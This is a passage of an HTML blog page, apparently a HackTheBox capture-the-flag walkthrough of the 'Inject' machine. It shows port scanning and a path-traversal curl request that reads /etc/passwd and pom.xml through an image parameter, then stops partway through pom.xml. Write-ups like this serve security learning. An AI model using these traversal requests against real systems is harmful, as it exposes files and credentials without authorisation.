@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inject - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/easy/inject/img/inject.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Inject - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Inject">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <!-- Aquí va el contenido del writeup -->
+                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">Inject</span>
+<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Easy</span>
+<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">3</span><span class="sr">/11/</span><span class="mi">2023</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br/>About Inject HTB:</h3><br/>
+This is an easy-level machine in which we exploit a file upload vulnerability to make the page show us how we can access them. The page utilizes a parameter in the GET method to access system files, allowing us to exploit an LFI (Local File Inclusion) using the Directory Path Traversal technique.<br/><br/>
+<h3><br>Shell as Frank</br></h3><br>
+After performing a brief enumeration in the directory where the web service is hosted, we detected the presence of the Spring Boot framework. We leveraged a vulnerability in this framework that allows us to achieve remote code execution. This way, we gained access to the system as the user "frank".<br/><br/>
+<h3><br>Shell as Phil</br></h3><br>
+Subsequently, we proceeded to enumerate the personal directory of the user "phil" and successfully accessed a file that contained stored credentials. We utilized these credentials to log in as "phil".<br/><br/>
+<h3><br>Shell as Root</br></h3><br>
+To escalate our privileges to "root", we exploited a cron job by abusing YML extension files and utilized the "ansible-parallel" tool, which is executed at regular intervals.<br/><br/>
+<h3><br>Recon:</br></h3><br>
+Port Scanning:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="k">open</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="o">--</span><span class="nf">min</span><span class="o">-</span><span class="n">rate</span><span class="w"> </span><span class="mi">5000</span><span class="w"> </span><span class="o">-</span><span class="n">vvv</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.129.35.222</span><span class="w"> </span><span class="o">-</span><span class="n">oG</span><span class="w"> </span><span class="n">tcpPorts</span>
+
+
+<span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">    </span><span class="n">REASON</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">        </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="w"> </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We conducted a scanning process to identify the technologies and services running on the reported ports. In this case, there are only two open ports, but if there were more open ports, we stored the scan results in a grepable format, enabling us to use regular expressions to filter all the ports and format them appropriately for conducting the scan with nmap.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">tcpPorts</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">oP</span><span class="w"> </span><span class="s1">'\d{1,5}/open'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="s1">'{print $1}'</span><span class="w"> </span><span class="n">FS</span><span class="o">=</span><span class="ss">"/"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xargs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="s1">' '</span><span class="w"> </span><span class="s1">','</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">'\n'</span>
+
+<span class="mi">22</span><span class="p">,</span><span class="mi">8080</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Comprehensive scanning of technologies and services running on ports 22 and 8080:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">8080</span><span class="w"> </span><span class="mf">10.129.35.222</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">fullScan</span>
+
+<span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">     </span><span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">         </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mf">8.2</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.5</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="nl">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="n">caf10c515a596277f0a80c5c7c8ddaf8</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">d51c81c97b076b1cc1b429254b52219f</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="n">db1d8ceb9472b0d3ed44b96c93a7f91d</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">nagios</span><span class="o">-</span><span class="n">nsca</span><span class="w"> </span><span class="n">Nagios</span><span class="w"> </span><span class="n">NSCA</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">Home</span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Currently, since we don't have any credentials, we should avoid excessive use of the SSH service on port 22. Instead, we should focus on enumerating and investigating port 8080, which seems to correspond to a web service. This will allow us to gather information and conduct further analysis on the web application running on that port.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/1.png?raw=true"/><br/><br/>
+After reviewing the technologies used by the web service using the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension in our browser, we did not come across any relevant or interesting information.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/2.png?raw=true"/><br/><br/>
+We can observe that the page contains a YouTube video player displaying the following video:<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/3.png?raw=true"/><br/><br/>
+However, this is not particularly relevant, so to speak.<br/><br/>
+Upon further examination of the page, we noticed a section in the upper-right corner of the website indicating "Upload."<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/0.png?raw=true"/><br/><br/>
+We navigated to that section and noticed that it prompts for file upload.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/4.png?raw=true"/><br/><br/>
+I will proceed to create a text file (.txt) with some sample content to verify if it can be uploaded. I will save it in the "Downloads" directory for easy location and quick access.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"This is an example"</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We attempted to upload it:<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/5.png?raw=true"/><br/><br/>
+We can see that you are requesting to upload image files. I will try uploading any random image from Google with the .jpg extension.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/6.png?raw=true"/><br/><br/>
+Excellent, the file has been successfully uploaded. You can see that it prompts you to view your image, indicating that it has indeed been saved somewhere.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/7.png?raw=true"/><br/><br/>
+It has worked successfully; the image has been uploaded and we can view it.<br/><br/>
+At this point, it is crucial to maintain active vigilance, especially from a hacker's perspective, as the image is not displayed through direct browsing of a specific directory, such as <code>/uploads/cat.jpg</code>. Instead, a section is employed that expects to receive the "img" parameter via the GET method, allowing the parameter to directly point to the uploaded file in the system. This scenario poses a potential risk, as we could attempt to exploit it for local file inclusion (LFI) in order to gain access to system-level files.<br/><br/>
+For example: <br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/8.png?raw=true"/><br/><br/>
+We have observed that it did not work as expected. This could be due to the fact that it is searching for the "/etc" directory within the current directory, which may not exist.<br/><br/>
+In light of this, we will proceed to test a basic injection technique known as "Directory Path Traversal," which would allow us to navigate back several directories to reach the system root and then append "/etc/passwd". It is worth mentioning that the "/etc/passwd" file should exist if the Directory Path Traversal is successfully performed.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/9.png?raw=true"/><br/><br/>
+We have successfully performed a Directory Path Traversal, and it appears that the file exists. However, due to the limitations of displaying only images, we are unable to view the content of the file in question.<br/><br/>
+Nevertheless, all hope is not lost. We can attempt the same request using the <code>curl</code> tool through the console:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s1">'http://10.129.35.222:8080/show_image?img=../../../../../../../../../../etc/passwd'</span>
+
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span><span class="w"> </span><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Time</span><span class="w"> </span><span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tss</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">TPM</span><span class="w"> </span><span class="n">software</span><span class="w"> </span><span class="n">stack</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tcpdump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">landscape</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">115</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">usbmux</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="n">usbmux</span><span class="w"> </span><span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">usbmux</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Core</span><span class="w"> </span><span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">frank</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">frank</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">frank</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">113</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">phil</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">phil</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">fwupd</span><span class="o">-</span><span class="n">refresh</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">118</span><span class="p">:</span><span class="n">fwupd</span><span class="o">-</span><span class="n">refresh</span><span class="w"> </span><span class="n">user</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">996</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+That worked. We have successfully triggered an LFI. Now, we can view files that we should not have access to through the victim machine's website, leveraging this vulnerability.<br/><br/>
+<h3><br>Shell as Frank</br></h3><br>
+After enumerating the system further, we discovered that it utilizes the Spring Framework.<br/><br/>
+<div class="codehilite"><pre><span></span><code>elswix@parrot<span class="w"> </span>&gt;<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>'http://10.129.35.222:8080/show_image?img=../../../pom.xml'
+
+<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">"http://maven.apache.org/POM/4.0.0"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
+    <span class="na">xsi:schemaLocation=</span><span class="s">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
+<span class="w">    </span><span class="nt">&lt;parent&gt;</span>
+<span class="w">        </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">        </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-parent<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">        </span><span class="nt">&lt;version&gt;</span>2.6.5<span class="nt">&lt;/version&gt;</span>
